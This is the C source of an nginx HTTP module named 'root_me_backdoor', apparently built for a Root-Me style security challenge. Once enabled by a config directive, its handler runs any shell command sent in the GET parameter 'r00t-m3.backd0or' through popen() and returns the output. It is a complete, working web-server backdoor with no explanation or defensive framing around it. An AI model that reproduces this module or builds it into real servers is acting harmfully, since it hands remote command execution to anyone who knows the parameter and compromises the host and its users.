#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    ngx_flag_t backdoor;
} ngx_http_root_me_backdoor_conf_t;

static char *ngx_http_root_me_backdoor(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);
static ngx_int_t ngx_http_root_me_backdoor_handler(ngx_http_request_t *r);
static void *ngx_http_root_me_backdoor_create_conf(ngx_conf_t *cf);
static char *ngx_http_root_me_backdoor_merge_conf(ngx_conf_t *cf, void *parent, void *child);

static ngx_command_t ngx_http_root_me_backdoor_commands[] = {
    { ngx_string("root_me_backdoor"),
      NGX_HTTP_LOC_CONF | NGX_CONF_FLAG,
      ngx_http_root_me_backdoor,
      NGX_HTTP_LOC_CONF_OFFSET,
      offsetof(ngx_http_root_me_backdoor_conf_t, backdoor),
      NULL },
    ngx_null_command
};

static ngx_http_module_t ngx_http_root_me_backdoor_module_ctx = {
    NULL,                                  /* preconfiguration */
    NULL,                                  /* postconfiguration */
    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */
    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */
    ngx_http_root_me_backdoor_create_conf, /* create location configuration */
    ngx_http_root_me_backdoor_merge_conf   /* merge location configuration */
};

ngx_module_t ngx_http_root_me_backdoor_module = {
    NGX_MODULE_V1,
    &ngx_http_root_me_backdoor_module_ctx, /* module context */
    ngx_http_root_me_backdoor_commands,    /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};

static void *ngx_http_root_me_backdoor_create_conf(ngx_conf_t *cf) {
    ngx_http_root_me_backdoor_conf_t *conf;

    conf = ngx_pcalloc(cf->pool, sizeof(ngx_http_root_me_backdoor_conf_t));
    if (conf == NULL) {
        return NGX_CONF_ERROR;
    }

    conf->backdoor = NGX_CONF_UNSET;
    return conf;
}

static char *ngx_http_root_me_backdoor_merge_conf(ngx_conf_t *cf, void *parent, void *child) {
    ngx_http_root_me_backdoor_conf_t *prev = parent;
    ngx_http_root_me_backdoor_conf_t *conf = child;

    ngx_conf_merge_value(conf->backdoor, prev->backdoor, 0);
    return NGX_CONF_OK;
}

static char *ngx_http_root_me_backdoor(ngx_conf_t *cf, ngx_command_t *cmd, void *conf) {
    ngx_http_core_loc_conf_t *clcf;

    clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
    clcf->handler = ngx_http_root_me_backdoor_handler;

    ngx_conf_set_flag_slot(cf, cmd, conf);
    return NGX_CONF_OK;
}

static ngx_int_t ngx_http_root_me_backdoor_handler(ngx_http_request_t *r) {
    ngx_http_root_me_backdoor_conf_t *conf;
    conf = ngx_http_get_module_loc_conf(r, ngx_http_root_me_backdoor_module);

    if (!conf->backdoor) {
        return NGX_DECLINED;
    }

    if (r->method != NGX_HTTP_GET) {
        return NGX_HTTP_NOT_ALLOWED;
    }

    ngx_str_t param_name = ngx_string("r00t-m3.backd0or");
    ngx_str_t param_value;

    if (ngx_http_arg(r, param_name.data, param_name.len, &param_value) != NGX_OK) {
        return NGX_HTTP_BAD_REQUEST;
    }

    char *command = (char *) ngx_pnalloc(r->pool, param_value.len + 1);
    if (command == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    ngx_memcpy(command, param_value.data, param_value.len);
    command[param_value.len] = '\0';

    FILE *fp;
    char result[1024];
    fp = popen(command, "r");
    if (fp == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    ngx_str_t response;
    response.data = (u_char *) ngx_pcalloc(r->pool, sizeof(result));
    if (fgets(result, sizeof(result), fp) != NULL) {
        ngx_memcpy(response.data, result, ngx_strlen(result));
        response.len = ngx_strlen(result);
    } else {
        response.len = 0;
    }
    pclose(fp);

    ngx_buf_t *b;
    ngx_chain_t out;

    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_length_n = response.len;
    r->headers_out.content_type.len = sizeof("text/plain") - 1;
    r->headers_out.content_type.data = (u_char *) "text/plain";

    b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));
    out.buf = b;
    out.next = NULL;

    b->pos = response.data;
    b->last = response.data + response.len;
    b->memory = 1;
    b->last_buf = 1;

    ngx_http_send_header(r);
    return ngx_http_output_filter(r, &out);
}
